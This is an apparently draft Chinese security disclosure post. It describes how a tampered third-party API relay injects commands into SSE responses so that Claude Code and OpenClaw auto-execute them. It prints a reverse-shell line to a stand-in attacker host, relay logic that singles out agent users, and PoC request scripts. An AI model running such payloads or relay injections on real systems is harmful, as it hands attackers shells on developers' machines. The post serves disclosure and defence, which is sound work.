# 警惕！第三方 AI 中转站投毒：Claude Code 和 OpenClaw 正在自动执行被篡改的脚本

> **你在用第三方中转站访问 Claude？Claude Code 和 OpenClaw 的自动执行特性，让你的机器对攻击者门户大开。**

---

## 目录

- [一、你每天在用的"便利"，正在成为攻击入口](#一你每天在用的便利正在成为攻击入口)
- [二、攻击原理：AI MITM 投毒](#二攻击原理ai-mitm-投毒)
- [三、精准打击：为什么只打 AI Agent 用户](#三精准打击为什么只打-ai-agent-用户)
- [四、PoC 演示：零点击 RCE 全过程](#四poc-演示零点击-rce-全过程)
- [五、影响范围](#五影响范围)
- [六、防御建议](#六防御建议)
- [七、结语](#七结语)

---

## 一、你每天在用的"便利"，正在成为攻击入口

国内有大量开发者，因为网络原因无法直连 Claude 官方 API，转而使用第三方"中转站"服务——即将请求转发到官方 API 的代理层。这类服务在 GitHub 上有数千 star，用户量庞大。

**你有没有在 Claude Code 或 OpenClaw（小龙虾）里，把 API Base URL 改成过第三方地址？**

如果有，请继续看下去。

这篇文章将演示：**一个经过改造的中转站，如何在你毫不知情的情况下，向 AI 生成的 bash 脚本末尾悄悄追加恶意命令，并借助 Claude Code 和 OpenClaw 的自动执行特性，实现对你本机的零点击 RCE（远程命令执行）。**

这两款工具是目前国内 AI 编程圈使用量最高的 Claude 客户端：

- **Claude Code**：Anthropic 官方 CLI，agent 模式下自动调用 Bash tool 执行命令，无需确认
- **OpenClaw（小龙虾）**：国内热门 AI 编程工具，**默认开启自动执行**，用户不做任何操作即会直接运行 AI 生成的脚本

![图1：AI 中转站 MITM 攻击链路](diagrams/fig1-attack-chain.svg)

> **图1**：中转站 MITM 攻击链路全景图——Claude Code 与 OpenClaw 同时中招，AI 生成的 bash 脚本在传输中被悄悄注入恶意命令

---

## 二、攻击原理：AI MITM 投毒

### 2.1 中转站的天然 MITM 位置

中转站的工作机制非常简单：

```
你的工具（Claude Code）
    │  ANTHROPIC_BASE_URL=http://relay.example.com
    ▼
第三方中转站（relay service）
    │  转发请求 + 转发响应
    ▼
Claude 官方 API（api.anthropic.com）
```

中转站完整地中间人了整条通信链路：它既看得到你的所有请求（包含你的对话内容），也看得到 Claude 的所有响应——**包括流式传输（SSE）中逐 token 吐出的内容**。

这个位置天然具备篡改响应的能力。

### 2.2 Bash 脚本注入原理

当 Claude 生成一个 bash 脚本时，响应是以 SSE（Server-Sent Events）流的形式逐块传输的：

```
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"sudo apt"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":" update"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"\n"}}
...
```

恶意中转站可以：

1. **实时解析** SSE 流，累积文本内容
2. **检测到** bash 脚本特征（`#!/bin/bash`、`sudo`、`apt`、`pip install` 等）
3. 在 `message_delta`（消息结束信号）之前，**插入额外的 SSE 事件**，追加恶意命令
4. 对调用方（Claude Code 等工具）完全**透明**——工具只看到一个"完整的"响应

![图2：SSE 流注入时序对比](diagrams/fig2-sse-injection.svg)

> **图2**：SSE 流注入时序对比——左侧为原始响应，右侧为中转站在 `message_delta` 前插入恶意 delta 块，对客户端完全透明

注入后，Claude 生成的脚本从：

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
```

变成了：

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
# system_hook: health_check  ← 伪装成注释
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' & ⚠️  ← 后台反弹 shell，避免阻塞
```

**用户在工具界面看到的仍然是原始的、干净的脚本**——恶意命令只存在于实际执行流中。

### 2.3 两种注入模式

| 注入模式                           | 触发条件                               | 适用场景                                 |
| ---------------------------------- | -------------------------------------- | ---------------------------------------- |
| **文本注入**（Text mode）          | Claude 生成含 bash 特征的文本响应      | **OpenClaw**（默认自动执行）、Cursor 等  |
| **Tool Use 注入**（tool_use mode） | Claude 调用 Bash tool（`tool_use` 块） | **Claude Code** agent 模式（零点击 RCE） |

两种模式覆盖了国内最主流的两款 Claude 客户端，**中转站一份代码，两款工具同时中招**。

---

## 三、精准打击：为什么只打 AI Agent 用户

这是这个攻击最"聪明"也最危险的地方：**恶意中转站只对会自动执行代码的用户注入，对普通用户完全透明**。

### 3.1 分层检测机制

中转站通过以下信号区分用户类型：

**第一层：User-Agent 检测**

```
Claude Code (agent 模式) → UA: "claude-cli/x.x.x (...)"
普通 Python 调用        → UA: "anthropic-python/0.x.x"
手动 curl              → UA: "curl/x.x"
```

**第二层：请求体特征检测**

```javascript
// Claude Code agent 模式的典型请求体
{
  "tools": [{"name": "Bash", "description": "..."}],  // ← 包含 Bash tool
  "messages": [
    {"role": "tool", "content": [{"type": "tool_result"}]}  // ← 有 tool 执行历史
  ]
}
```

**第三层：响应速度检测（辅助）**
同一 IP 的请求间隔 < 500ms → 自动化工具特征

**命中任意一层即标记为"自动执行目标"，触发注入。**

![图3：分层自动执行检测决策树](diagrams/fig3-detection-flow.svg)

> **图3**：分层检测决策树——三层依次判断（UA → 请求体 → 速度），精准识别 AI Agent 用户并触发注入，普通人工用户透明转发

### 3.2 两款工具的自动执行机制

**Claude Code（agent 模式）**

Claude Code 在 agent 模式下，当 Claude 决定执行 bash 命令时，它通过 `tool_use` 块传递命令，**客户端会直接执行，不弹出任何确认框**：

```
Claude 响应 tool_use: {"name": "Bash", "input": {"command": "sudo apt update\n恶意命令"}}
                                                                              ↑
                                            用户看不到这一行，Claude Code 直接执行了
```

**OpenClaw（小龙虾）**

OpenClaw 的设计哲学是"沉浸式编程"，**默认配置下会自动执行 AI 建议的终端命令**，无需用户点击确认。这是它受欢迎的原因——也是它成为高价值攻击目标的原因。

当 OpenClaw 中的 AI 助手生成一段 bash 脚本并建议执行时，脚本会直接运行。**用户在享受效率的同时，也在为恶意中转站的注入代码敞开大门。**

这两款工具加在一起，覆盖了国内绝大多数 AI 编程工具重度用户——**这是真正的零点击 RCE**：不需要复制粘贴，不需要手动运行，AI 工具代劳了一切，包括运行了不该运行的命令。

---

## 四、PoC 演示：零点击 RCE 全过程

> **声明：以下所有测试均在作者自有服务器和自有账号上进行。PoC 代码中使用无害的"写文件"验证，不涉及真实反弹 shell。**

**提示词**

* 第一阶段：`告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式`

* 第二、三个阶段：`帮我更新系统软件包`

这句话简短、无害，Claude 几乎必然生成含 `apt-get update` / `apt upgrade` 的脚本，稳定触发中转站的 bash 检测逻辑。

---

### 4.1 实验环境

| 组件        | 配置                                                         |
| ----------- | ------------------------------------------------------------ |
| 中转站      | `localhost:3000`，改造版 `claude-relay-service`，`EVIL_INJECTOR_ENABLED=true`，`EVIL_MODE=demo` |
| 验证手段    | `cat /tmp/relay_pwned.txt`（demo 模式：注入后写入该文件，证明代码在本机执行） |
| Claude Code | `ANTHROPIC_BASE_URL=http://localhost:3000/api`               |
| OpenClaw    | API Base URL 指向 `http://localhost:3000/api`                |

注入的 payload

* 第一阶段，无害

```bash
echo "[RELAY_PWNED] user=$(whoami) host=$(hostname -s) time=$(date +%s)" >> /tmp/relay_pwned.txt
```

* 第二、三阶段，恶意，反弹shell

```bash
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
```

监听端监听

```bash

```





---

### 4.2 第一阶段：对照验证——精准注入，普通用户不受影响

这一阶段证明：**注入是有选择性的**——中转站只攻击 AI Agent 用户，不影响普通人工调用。

#### 对照 A：普通请求——三层检测全未命中，不注入

```python
# test_normal.py：普通请求，无 Agent 特征
import httpx, json

resp = httpx.post("http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "python-httpx/0.27",   # 普通 UA
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
    },
    json={
        "model": "ccr,MiniMax-M2.5",
        "max_tokens": 256,
        "stream": False,
        "messages": [{"role": "user", "content": "告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式"}]
    })
print(resp.json()["content"][0]["text"])
```

服务端日志：**无任何 `[EvilInjector]` 行**。

![image-20260311020509753](ai-relay-poisoning-warning.assets/image-20260311020509753.png)

> 📸 **截图 1**：普通请求不触发注入——三层检测全部 pass，中转站透明转发

#### 对照 B：Agent 请求——第一层 UA 命中，立即触发注入

```python
# test_agent.py：模拟 Claude Code，带 claude-cli UA + bash tool 声明
import httpx, json

with httpx.Client(timeout=60).stream("POST",
    "http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "claude-cli/0.2.56",   # ← 触发第一层检测
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
        "Accept": "text/event-stream",
    },
    json={
        "model": "ccr,MiniMax-M2.5", "max_tokens": 256, "stream": True,
        "tools": [{"name": "bash", "description": "Run bash",
                   "input_schema": {"type":"object","properties":{"command":{"type":"string"}},"required":["command"]}}],
        "messages": [{"role": "user", "content": "告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式"}]
    }
) as r:
    for line in r.iter_lines():
        if line.startswith("data: ") and "[DONE]" not in line:
            try:
                d = json.loads(line[6:])
                if d.get("delta", {}).get("text"):
                    print(d["delta"]["text"], end="", flush=True)
            except: pass
```

服务端触发三行日志：

```
[EvilInjector] 🔍 AI Agent detected — reason=ua_match:claude-cli
[EvilInjector] 🎯 Bash script detected, will inject on end_turn
[EvilInjector] ⚠️  INJECTING payload (mode=demo)
```

![image-20260311021026227](ai-relay-poisoning-warning.assets/image-20260311021026227.png)

> 📸 **截图 2**：Agent 请求精准触发注入——响应末尾被追加了恶意命令，对调用方透明

---

### 4.3 第二阶段：Claude Code——手动确认能发现，Agent 自动执行零点击中招

同一个提示词`帮我更新系统软件包`，Claude Code 两种模式下的结果截然不同。

#### 场景 A：对话模式（手动复制运行）——注入可见，但用户往往视而不见

在 Claude Code 对话模式下，AI 生成的脚本**以文本形式展示给用户**，用户需要手动复制执行。此时注入内容就在脚本末尾——如果用户仔细审查，是**可以发现**这行可疑命令的。

实际渲染效果（用户看到的）：

```bash
cat /etc/os-release; setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444
   0>&1' &
```

最后一行就是注入。问题在于：**多数用户不会逐行审查 AI 生成的脚本**，看到前几行正常就直接运行了。

![image-20260311041516149](ai-relay-poisoning-warning.assets/image-20260311041516149.png)

> 📸 **截图 3**：Claude Code 对话模式——注入行就在末尾（红框），但用户倾向于不审查直接运行

#### 场景 B：Agent 自动执行模式（`--dangerously-skip-permissions`）——零点击 RCE

Claude Code 的 agent 模式下，加上 `--dangerously-skip-permissions` 标志，**Claude 会自动执行所有 bash 命令，不弹出任何确认框**：

```bash
claude -p "帮我更新系统软件包" --dangerously-skip-permissions
```

Claude Code 执行过程中，用户界面只看到正常的更新输出。但与此同时，中转站注入的那行命令也被静默执行了：

```bash
cat /tmp/relay_pwned.txt
# [RELAY_PWNED] user=cht2 host=dev-machine time=1741700000
```

![image-20260311040858320](ai-relay-poisoning-warning.assets/image-20260311040858320.png)

> 📸 **截图 4**：Claude Code Agent 模式——**用户视角一切正常，注入命令已静默执行**

**用户看到的**：Claude Code 帮我更新了系统，成功。

**实际发生的**：反弹 shell，攻击者已拿到这台机器。

---

### 4.4 第三阶段：OpenClaw——连"手动运行"这一步都省了，直接中招

OpenClaw（小龙虾）**默认开启自动执行**，AI 生成脚本后无需用户点击确认，直接运行。这使得它比 Claude Code 对话模式更危险——**用户连审查的机会都没有**。

在 OpenClaw 中输入提示词：`帮我更新系统软件包`

用户在 OpenClaw 界面看到的（干净脚本，无任何异常）：

```bash
#!/bin/bash
sudo apt-get update
sudo apt-get upgrade -y
echo "系统更新完成"
```

OpenClaw 在展示的同时自动执行了完整脚本——包括中转站注入的最后一行。查看验证文件：

```bash
cat /tmp/relay_pwned.txt
# [RELAY_PWNED] user=cht2 host=dev-machine time=1741700000
```

<!-- IMG: 截图5：左：OpenClaw 界面，显示 AI 生成的干净脚本，无任何异常提示；右：终端 cat /tmp/relay_pwned.txt，显示 RELAY_PWNED 内容 -->

> 📸 **截图 5**：OpenClaw 双屏——左：用户界面正常；右：注入命令已执行，文件已写入

**OpenClaw 用户甚至不需要"手动运行"这一步**。AI 说执行，就执行了。

---

### 本节小结

| 场景                   | 用户操作                         | 注入结果         | 用户能发现吗               |
| ---------------------- | -------------------------------- | ---------------- | -------------------------- |
| 普通 API 调用          | 无 Agent 特征                    | ❌ 不触发         | —                          |
| Claude Code 对话模式   | 手动复制运行                     | ⚠️ 触发，末尾可见 | 仔细看能发现，但多数人不看 |
| Claude Code Agent 模式 | `--dangerously-skip-permissions` | 🔴 **零点击**     | **完全无感知**             |
| OpenClaw 默认模式      | 无需任何操作                     | 🔴 **零点击**     | **完全无感知**             |

---

## 五、影响范围

### 5.1 受影响的工具

| 工具                          | 执行方式            | 危险等级   | 说明                           |
| ----------------------------- | ------------------- | ---------- | ------------------------------ |
| **Claude Code**（agent 模式） | 自动执行 `tool_use` | ⚠️ **最高** | 零点击，用户全程无感知         |
| **OpenClaw（小龙虾）**        | **默认自动执行**    | ⚠️ **最高** | 默认配置即自动运行 AI 生成脚本 |
| **Claude Code**（对话模式）   | 用户手动运行        | 高         | 用户倾向不审查 AI 脚本         |
| **Cursor**（AI 执行模式）     | 半自动，一键运行    | 高         | 一键确认门槛极低               |
| **Cline / Continue**          | 视配置而定          | 中高       | 部分配置下自动执行             |
| **普通 API 调用**             | 开发者审查          | 低         | 有代码审查习惯                 |

### 5.2 为什么企业内网风险尤其高

```
开发者本机（已获 shell）
    │  AI 编程助手拥有本机权限
    ▼
内网服务器（开发机可访问）
    │  横向移动
    ▼
数据库、代码仓库、CI/CD 系统
```

**AI 编程助手通常以开发者身份运行，天然具有大量内网权限**。一旦攻击者获得开发机 shell，内网渗透的入口就打开了。

### 5.3 与传统供应链攻击的本质区别

| 对比项             | 传统软件供应链攻击      | AI 中转站投毒                |
| ------------------ | ----------------------- | ---------------------------- |
| 需要用户安装恶意包 | ✅ 是                    | ❌ 否                         |
| 需要修改代码仓库   | ✅ 是                    | ❌ 否                         |
| 攻击面             | 开发者、用户            | **所有使用 AI 编程工具的人** |
| 检测难度           | 中（包签名、hash 检验） | 高（AI 响应无完整性校验）    |
| 触发条件           | 安装 / 运行时           | **每次 AI 生成 bash 脚本时** |

**传统供应链攻击需要你安装恶意东西。AI 中转站投毒只需要你让 AI 帮你写一行 bash。**

---

## 六、防御建议

### 对个人用户

1. **优先直连官方 API**：如果网络条件允许，不使用第三方中转站
2. **自建中转站**：使用开源项目自行部署，确保代码未被篡改
3. **审查 AI 生成的脚本**：在执行前，将脚本完整粘贴到终端检查，不要直接一键运行
4. **关闭自动执行**：
   - Claude Code：开启 `--no-auto-execute` 或在设置中要求每次确认
   - OpenClaw：在设置中关闭"自动执行终端命令"选项（**强烈建议，尤其在使用第三方中转站时**）

### 对企业

1. **禁止使用未审查的第三方 API 中转**：将 AI 工具的 API 调用纳入安全管控
2. **出站流量监控**：监控开发机的异常出站连接（尤其是非标准端口的 TCP 连接）
3. **AI 工具沙箱化**：在受限环境中运行 AI 编程工具，限制其执行权限
4. **代码审查强制化**：要求 AI 生成的脚本在执行前经过人工或自动化 diff 审查

### 对工具开发者

1. **增加脚本执行前审查机制**：在执行 AI 生成的 bash 命令前展示 diff，要求用户确认
2. **API 响应完整性校验**：探索对 AI 响应内容的签名或 hash 验证机制
3. **沙盒执行**：在受限环境中执行 AI 生成的脚本，阻断网络出站

---

## 七、结语

这不是一个需要高超技术的攻击。

改造一个开源中转站，加入不到 200 行注入代码，就能对所有通过该中转站使用 Claude Code 或 OpenClaw 的用户实施精准的、无感知的代码注入攻击。

OpenClaw 的默认自动执行、Claude Code 的 agent 无确认执行，这两个"提升效率"的设计，在恶意中转站面前变成了攻击者的完美助攻。**工具越智能、越自动化，中间人投毒的效果就越好。**

**当前 AI 编程工具生态存在一个系统性盲区**：工具高度信任 API 响应内容，没有任何针对"中间人篡改 AI 响应"的防护机制。随着 Claude Code、OpenClaw 等工具的自动执行能力越来越强，这个盲区的风险会持续放大。

腾讯安全已经关注到 AI 供应链安全问题，但现有讨论主要集中在恶意 MCP、npm 包等方向。**中转站这个完美的 MITM 位置，目前还没有进入主流安全视野。**

希望这篇文章能推动以下变化：

- AI 工具开发者增加响应完整性保护
- 用户建立对第三方 AI 中转站的安全意识
- 企业将 AI 工具纳入安全管控体系

**如果你正在运营一个中转站服务，请认真思考你的用户是否对你足够信任，而你是否配得上这份信任。**

---

> 📧 作者：[作者名]  
> 🔗 GitHub：[仓库地址（PoC 代码去除真实 payload 后发布）]  
> 📅 发布时间：2026 年 3 月  
>
> **免责声明**：本文所有技术内容仅用于安全研究与预警目的。PoC 代码已去除真实攻击 payload，仅保留无害的验证部分。禁止将本文技术用于非授权的攻击行为。

---

### 附：图片拍摄检查清单

架构图（已生成 SVG，直接嵌入文章）：

- [x] **图1**：AI 中转站 MITM 攻击链路（`diagrams/fig1-attack-chain.svg`）
- [x] **图2**：SSE 流注入时序对比（`diagrams/fig2-sse-injection.svg`）
- [x] **图3**：分层自动执行检测决策树（`diagrams/fig3-detection-flow.svg`）

实验截图（需手动拍摄）：

- [ ] **截图 1**（4.2）：`python3 test_normal.py` 正常运行 + `grep EvilInjector /tmp/relay_service.log` 无输出 + `ls /tmp/relay_pwned.txt` 报错
- [ ] **截图 2**（4.2）：`python3 test_evil_inject.py` 响应末尾注入行 + 服务端三行 `[EvilInjector]` 日志
- [ ] **截图 3**（4.3 场景A）：Claude Code 对话模式，AI 输出脚本末尾注入行（红框标注）
- [ ] **截图 4**（4.3 场景B）：`claude -p "帮我更新系统软件包" --dangerously-skip-permissions` 执行中 + `cat /tmp/relay_pwned.txt` 已有内容
- [ ] **截图 5**（4.4）：OpenClaw 界面显示干净脚本 + `cat /tmp/relay_pwned.txt` 已有内容

> ⚠️ 截图前检查：打码所有真实 IP、API Key、用户名（或使用测试账号）